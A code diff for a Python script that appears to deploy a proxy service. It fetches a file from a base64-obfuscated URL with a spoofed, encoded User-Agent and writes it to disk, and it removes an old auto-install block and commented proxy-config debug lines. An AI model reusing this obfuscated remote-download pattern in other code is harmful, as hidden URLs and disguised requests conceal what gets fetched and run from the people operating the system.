@@ -9,8 +9,9 @@ import sys
 import zipfile
 from base64 import b64decode as de
 from ast import literal_eval
-from subprocess import run,Popen
+from subprocess import run, Popen
 from os.path import join as jo
+import urllib.request
 
 
 class Demo:
@@ -152,29 +153,20 @@ class Demo:
             else:
                 os.remove(_file)
         else:
-            try:
-                import requests
-            except:
-                print(Popen("apt update".split(" ")).communicate())
-                print(Popen("apt install python3-pip -y".split(" ")).communicate())
-                print(Popen("python3 -m pip install requests".split(" ")).communicate())
-                import requests
-            requests.packages.urllib3.disable_warnings(
-                requests.packages.urllib3.exceptions.InsecureRequestWarning)
-
             with open(jo(
                     self._c, ".".join((os.path.splitext(self._import_modules[-1])[0], self.this('mvc')))), "wb") as _f:
-                _session = requests.Session()
-                _response = _session.get(
-                    de(self.this(self._index).encode("utf8")).decode("utf8"),
-                    headers={
-                        "Accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                        "Accept-Encoding": 'gzip, deflate, br',
-                        'Connection': 'keep-alive', "Accept-Language": 'en-US,en;q=0.5',
-                        'User-Agent': de(self.this(random.choice(self._id_ua)).encode("utf8")).decode("utf8")},
-                    timeout=random.uniform(6, 10), verify=False, allow_redirects=True, stream=True)
-                for _d in _response.iter_content(chunk_size=random.randint(4096, 8192)):
-                    if _d: _f.write(_d)
+                headers = {
+                    "Accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                    "Accept-Encoding": 'gzip, deflate, br',
+                    'Connection': 'keep-alive', "Accept-Language": 'en-US,en;q=0.5',
+                    'User-Agent': de(self.this(random.choice(self._id_ua)).encode("utf8")).decode("utf8"),
+                }
+                timeout = random.uniform(6, 10)
+                req = urllib.request.Request(de(self.this(self._index).encode("utf8")).decode("utf8"), headers=headers)
+                response = urllib.request.urlopen(req, timeout=timeout)
+                content = response.read()
+                response.close()
+                _f.write(content)
             self.check()
 
     def create(self):
@@ -209,16 +201,6 @@ class Demo:
             else:
                 _map[_kk[-1]] = v
 
-
-# print(Demo.this(base64.b64encode(
-#     "inbounds.3.port".encode("utf8")).decode("utf8")))
-# print(Demo.this(base64.b64encode(
-#     "inbounds.3.settings.clients.0.password".encode("utf8")).decode("utf8")))
-# print(Demo.this(base64.b64encode(
-#     "inbounds.3.streamSettings.wsSettings.path".encode("utf8")).decode("utf8")))
-# exit(0)
-# print(tuple(a))
-# print(Demo.this(b"cnVu".decode("utf8")))
 
 if __name__ == "__main__":
     demo = Demo()
